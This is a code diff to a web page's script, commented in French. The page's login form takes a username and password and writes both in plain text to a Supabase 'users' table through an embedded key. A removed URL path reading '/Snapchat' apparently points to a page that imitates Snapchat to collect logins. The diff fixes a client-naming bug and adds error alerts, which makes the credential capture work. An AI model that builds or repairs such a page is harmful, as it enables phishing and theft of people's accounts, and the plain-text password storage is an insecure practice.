@@ -59,10 +59,10 @@ button{
 </div>
 
 <script>
-const supabaseUrl = "https://qarjoeeftvtrzoqyufgb.supabase.co/Snapchat";
+const supabaseUrl = "https://qarjoeeftvtrzoqyufgb.supabase.co";
 const supabaseKey = "sb_publishable_-81q9wbD36UU-U9eBdP-AQ_wvgIUeHO";
 
-const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
 
 document.querySelector("form").addEventListener("submit", async function(e){
     e.preventDefault();
@@ -70,15 +70,15 @@ document.querySelector("form").addEventListener("submit", async function(e){
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    // 💾 envoi vers base de données
-    await supabase.from("users").insert([
-        {
-            username: username,
-            password: password
-        }
-    ]);
+    const { error } = await supabaseClient
+        .from("users")
+        .insert([{ username, password }]);
 
-    alert("Envoyé à la base de données ✔");
+    if(error){
+        alert("Erreur ❌ : " + error.message);
+    } else {
+        alert("Envoyé ✔");
+    }
 });
 </script>
 
